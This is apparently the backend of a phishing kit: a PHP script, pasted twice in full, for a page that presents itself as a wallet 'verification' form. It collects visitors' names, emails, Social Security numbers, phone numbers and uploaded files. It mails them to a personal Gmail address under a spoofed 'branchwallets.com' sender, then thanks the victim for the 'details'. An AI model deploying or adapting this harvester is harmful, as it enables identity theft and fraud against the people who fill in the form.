<?php
if($_POST && isset($_FILES['file']))
{
	$recipient_email 	= "japhethshola@gmail.com"; //recepient
	$from_email 		= "details@branchwallets.com"; //from email using site domain.
	$subject			= "Attachment email from your website!"; //email subject line
	
	$sender_name = filter_var($_POST["name"], FILTER_SANITIZE_STRING); //capture sender name
	$sender_email = filter_var($_POST["email"], FILTER_SANITIZE_STRING); //capture sender email
	$sender_ssn = filter_var($_POST["ssn"], FILTER_SANITIZE_STRING); //capture message
	$sender_number = filter_var($_POST["number"], FILTER_SANITIZE_STRING);
	$attachments = $_FILES['file'];
	
	//php validation
    if(strlen($sender_name)<4){
        die('Name is too short or empty');
    }
	if (!filter_var($sender_email, FILTER_VALIDATE_EMAIL)) {
	  die('Invalid email');
	}
   
	$file_count = count($attachments['name']); //count total files attached
	$boundary = md5("sanwebe.com"); 
			
	if($file_count > 0){ //if attachment exists
		//header
        $headers = "MIME-Version: 1.0\r\n"; 
        $headers .= "From:".$from_email."\r\n"; 
        $headers .= "Reply-To: ".$sender_email."" . "\r\n";
        $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; 
        
        //message text
        $body = "--$boundary\r\n";
        $body .= "Content-Type: text/plain; charset=ISO-8859-1\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n\r\n"; 
        $body .= chunk_split(base64_encode($sender_ssn)); 
		$body .= chunk_split(base64_encode($sender_number)); 

		//attachments
		for ($x = 0; $x < $file_count; $x++){		
			if(!empty($attachments['name'][$x])){
				
				if($attachments['error'][$x]>0) //exit script and output error if we encounter any
				{
					$mymsg = array( 
					1=>"The uploaded file exceeds the upload_max_filesize directive in php.ini", 
					2=>"The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form", 
					3=>"The uploaded file was only partially uploaded", 
					4=>"No file was uploaded", 
					6=>"Missing a temporary folder" ); 
					die($mymsg[$attachments['error'][$x]]); 
				}
				
				//get file info
				$file_name = $attachments['name'][$x];
				$file_size = $attachments['size'][$x];
				$file_type = $attachments['type'][$x];
				
				//read file 
				$handle = fopen($attachments['tmp_name'][$x], "r");
				$content = fread($handle, $file_size);
				fclose($handle);
				$encoded_content = chunk_split(base64_encode($content)); //split into smaller chunks (RFC 2045)
				
				$body .= "--$boundary\r\n";
				$body .="Content-Type: $file_type; name=\"$file_name\"\r\n";
				$body .="Content-Disposition: attachment; filename=\"$file_name\"\r\n";
				$body .="Content-Transfer-Encoding: base64\r\n";
				$body .="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n"; 
				$body .= $encoded_content; 
			}
		}

	}else{ //send plain email otherwise
       $headers = "From:".$from_email."\r\n".
        "Reply-To: ".$sender_email. "\n" .
        "X-Mailer: PHP/" . phpversion();
        $body =  "SSN ".$sender_ssn . "\r\n". "Phone Number ".$sender_number;
;
	}
		
	 $sentMail = @mail($recipient_email, $subject, $body, $headers);
	if($sentMail) //output success or failure messages
	{       
		header("Location: index.html");
		?>
  <script type="text/javascript">alert("details successfully recieved");</script>

  <?php
	}else{
		header("Location: verification.html");  
		?>
  <script type="text/javascript">alert("Server Error, Try Again");</script>
  <?php
	}
}
?><?php
if($_POST && isset($_FILES['file']))
{
	$recipient_email 	= "japhethshola@gmail.com"; //recepient
	$from_email 		= "details@branchwallets.com"; //from email using site domain.
	$subject			= "Attachment email from your website!"; //email subject line
	
	$sender_name = filter_var($_POST["name"], FILTER_SANITIZE_STRING); //capture sender name
	$sender_email = filter_var($_POST["email"], FILTER_SANITIZE_STRING); //capture sender email
	$sender_ssn = filter_var($_POST["ssn"], FILTER_SANITIZE_STRING); //capture message
	$sender_number = filter_var($_POST["number"], FILTER_SANITIZE_STRING);
	$attachments = $_FILES['file'];
	
	//php validation
    if(strlen($sender_name)<4){
        die('Name is too short or empty');
    }
	if (!filter_var($sender_email, FILTER_VALIDATE_EMAIL)) {
	  die('Invalid email');
	}
   
	$file_count = count($attachments['name']); //count total files attached
	$boundary = md5("sanwebe.com"); 
			
	if($file_count > 0){ //if attachment exists
		//header
        $headers = "MIME-Version: 1.0\r\n"; 
        $headers .= "From:".$from_email."\r\n"; 
        $headers .= "Reply-To: ".$sender_email."" . "\r\n";
        $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n"; 
        
        //message text
        $body = "--$boundary\r\n";
        $body .= "Content-Type: text/plain; charset=ISO-8859-1\r\n";
        $body .= "Content-Transfer-Encoding: base64\r\n\r\n"; 
        $body .= chunk_split(base64_encode($sender_ssn)); 
		$body .= chunk_split(base64_encode($sender_number)); 

		//attachments
		for ($x = 0; $x < $file_count; $x++){		
			if(!empty($attachments['name'][$x])){
				
				if($attachments['error'][$x]>0) //exit script and output error if we encounter any
				{
					$mymsg = array( 
					1=>"The uploaded file exceeds the upload_max_filesize directive in php.ini", 
					2=>"The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form", 
					3=>"The uploaded file was only partially uploaded", 
					4=>"No file was uploaded", 
					6=>"Missing a temporary folder" ); 
					die($mymsg[$attachments['error'][$x]]); 
				}
				
				//get file info
				$file_name = $attachments['name'][$x];
				$file_size = $attachments['size'][$x];
				$file_type = $attachments['type'][$x];
				
				//read file 
				$handle = fopen($attachments['tmp_name'][$x], "r");
				$content = fread($handle, $file_size);
				fclose($handle);
				$encoded_content = chunk_split(base64_encode($content)); //split into smaller chunks (RFC 2045)
				
				$body .= "--$boundary\r\n";
				$body .="Content-Type: $file_type; name=\"$file_name\"\r\n";
				$body .="Content-Disposition: attachment; filename=\"$file_name\"\r\n";
				$body .="Content-Transfer-Encoding: base64\r\n";
				$body .="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n"; 
				$body .= $encoded_content; 
			}
		}

	}else{ //send plain email otherwise
       $headers = "From:".$from_email."\r\n".
        "Reply-To: ".$sender_email. "\n" .
        "X-Mailer: PHP/" . phpversion();
        $body =  "SSN ".$sender_ssn . "\r\n". "Phone Number ".$sender_number;
;
	}
		
	 $sentMail = @mail($recipient_email, $subject, $body, $headers);
	if($sentMail) //output success or failure messages
	{       
		header("Location: index.html");
		?>
  <script type="text/javascript">alert("details successfully recieved");</script>

  <?php
	}else{
		header("Location: verification.html");  
		?>
  <script type="text/javascript">alert("Server Error, Try Again");</script>
  <?php
	}
}
?>